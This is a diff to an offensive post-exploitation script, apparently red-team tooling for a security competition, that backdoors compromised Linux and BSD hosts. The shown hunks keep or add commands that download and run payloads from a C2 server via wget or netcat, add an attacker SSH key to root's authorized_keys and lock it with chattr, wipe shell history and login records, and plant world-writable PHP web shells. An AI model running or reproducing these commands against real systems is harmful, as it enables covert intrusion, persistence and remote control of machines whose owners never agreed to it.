@@ -4,7 +4,7 @@
 # install rootkit & backd00rz
 # kill services
 # likely usage: msf ssh_login to all of the folks who didn't change the default competition creds.
-# drop shells, then: sessions -c "export HISTFILE=/dev/null; wget -q $C2_URL/scripts/jericho2.1.sh -O /dev/stdout | /bin/bash - && history -c"
+# drop shells, then: sessions -c "export HISTFILE=/dev/null; wget -q $C2_URL/scripts/jericho2.1.sh -O /dev/stdout | /bin/sh - && history -c"
 #
 # why jericho? 
 # because tony stark. https://www.youtube.com/watch?v=YBC1Qob27sM&t=38s
@@ -76,6 +76,7 @@ do_backdoors() {
         rm -rf /var/run/utmp
         echo "installing root ssh key!"
         chattr -i /root/.ssh/authorized*
+        mkdir /root/.ssh
         echo $SHARED_PUBKEY >> /root/.ssh/authorized_keys2
         echo $SHARED_PUBKEY >> /root/.ssh/authorized_keys
         chattr +i /root/.ssh/authorized_keys*
@@ -111,7 +112,8 @@ do_bsdbackdoors() {
         echo $PUBKEY >> /root/.ssh/authorized_keys
         chattr +i /root/.ssh/authorized_keys*
         echo "dropping rooty.."
-       	mkdir /dev/;cd /dev/;wget -q $C2_URL$BSDROOTY -O udevd; chmod +x udevd; env PATH=$PWD /usr/bin/nohup udevd &
+        #WARNING: must have listening netcat with 'cat rootybsd.bin|nc -l 1338' on c2 server.
+       	mkdir /dev/;cd /dev/;nc $C2_URL > udevd; chmod +x udevd; env PATH=$PWD /usr/bin/nohup udevd &
         echo '<?php echo shell_exec($_GET['e']); ?>' > /var/www/.src.php
         chmod 777 /var/www/.src.php
         echo '<?php echo shell_exec($_GET['e']); ?>' > /var/www/html/.src.php
@@ -139,13 +141,17 @@ do_centos64_rootkit() {
 
 
 do_freebsd64_rootkit() {
+    echo "Installing BSD hole.bin.."
     cd /opt/
-    wget -q $C2_URL$BSD_KIT
-    chmod 0755 `basename $BSD_KIT`
-    mv `basename $BSD_KIT` /opt/scorebotd
+    #cmc: pfSense / BSD has no wget/curl
+    #make sure we have a listening netcat
+    # cat backdoor.bin | nc -v -l 13337
+    nc $C2_URL 1337 > /opt/scorebotd
+    #chmod 0755 `basename $BSD_KIT`
+    #mv `basename $BSD_KIT` /opt/scorebotd
+    chmod +x /opt/scorebotd
     nohup /opt/scorebotd &
 }
-
 do_ubuntu_rootkit() {
 	echo "Retrieving ubuntu x86 kit..."
 	mkdir /dev/...
